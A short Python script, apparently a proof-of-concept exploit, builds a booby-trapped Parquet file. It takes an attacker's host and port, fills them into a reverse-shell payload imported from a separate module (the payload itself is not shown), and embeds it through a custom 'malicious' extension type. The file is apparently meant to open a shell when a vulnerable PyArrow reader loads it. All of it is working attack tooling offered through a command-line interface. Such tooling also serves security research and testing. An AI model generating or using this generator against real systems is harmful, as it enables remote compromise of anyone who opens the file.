import fire
import pyarrow as pa
import pyarrow.parquet as pq

from common import REVSHELL_PAYLOAD, MaliciousStringType


def generate_malicious_parquet(lhost: str, lport: int, output_file: str = 'malicious.parquet'):
    REVSHELL_PAYLOAD[2] = REVSHELL_PAYLOAD[2].format(LHOST=lhost, LPORT=lport)
    table = pa.Table.from_arrays(
        [
            pa.array([], pa.int64()),
            pa.array([], MaliciousStringType(REVSHELL_PAYLOAD))
        ],
        names=["id", "name"]
    )
    pq.write_table(table, output_file)


if __name__ == "__main__":
    fire.Fire(generate_malicious_parquet)
